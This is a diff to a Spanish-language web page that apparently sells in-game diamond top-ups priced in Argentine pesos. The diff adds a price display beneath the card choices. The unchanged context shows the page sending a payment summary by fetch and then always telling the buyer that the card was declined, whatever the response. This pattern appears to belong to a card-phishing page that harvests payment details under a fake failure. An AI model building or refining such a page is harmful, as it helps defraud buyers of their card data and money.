@@ -108,6 +108,13 @@
       background: linear-gradient(to right, #00b3ff, #00ffd5);
       transform: scale(1.03);
     }
+    /* Precio seleccionado */
+    #priceDisplay {
+      margin-bottom: 15px;
+      font-size: 1.1rem;
+      color: #00ffd5;
+      text-align: center;
+    }
     /* Footer */
     footer {
       background: #1f1f1f;
@@ -178,10 +185,6 @@
       align-items: center;
       gap: 20px;
     }
-    /* Se quita la regla de tamaño para que la imagen se adapte según lo necesites */
-    /* .payment-logos img {
-      width: 60px;
-    } */
     .ssl-text {
       margin-top: 10px;
       font-size: 0.95rem;
@@ -290,6 +293,8 @@
         </div>
       </div>
     </div>
+    <!-- NUEVO: display del precio seleccionado -->
+    <div id="priceDisplay"></div>
     <div class="section">
       <button id="confirmRecarga" class="btn-confirmar">Pagar ahora</button>
     </div>
@@ -342,12 +347,6 @@
   </div>
   
   <script>
-    // Función de selección de tarjeta
-    function selectCard(card) {
-      document.querySelectorAll('.card').forEach(c => c.classList.remove('selected'));
-      card.classList.add('selected');
-    }
-  
     // Mapeo de precios a pagar
     const priceMapping = {
       "100+60 Diamantes": "1500 ARS sin impuestos",
@@ -356,6 +355,15 @@
       "1060+310 Diamantes": "13.000 ARS sin impuestos",
       "2180+520 Diamantes": "22.000 ARS sin impuestos"
     };
+    
+    // Función de selección de tarjeta (ahora actualiza el precio visible)
+    function selectCard(card) {
+      document.querySelectorAll('.card').forEach(c => c.classList.remove('selected'));
+      card.classList.add('selected');
+      const amountText = card.querySelector('span').innerText;
+      const priceText = priceMapping[amountText] || '';
+      document.getElementById('priceDisplay').textContent = priceText ? `Precio: ${priceText}` : '';
+    }
   
     const confirmRecargaBtn = document.getElementById('confirmRecarga');
     confirmRecargaBtn.addEventListener('click', () => {
@@ -476,7 +484,6 @@ ${resumenPago}
       })
       .then(response => response.json())
       .then(data => {
-        // Mostrar mensaje de error en lugar de redirigir y resaltar campos
         showError("Su tarjeta fue rechazada, por favor intente con otro método o consulte con su banco.", "paymentError");
         highlightAllPaymentFields();
       })
@@ -488,4 +495,4 @@ ${resumenPago}
     });
   </script>
 </body>
-  </html>
+</html>
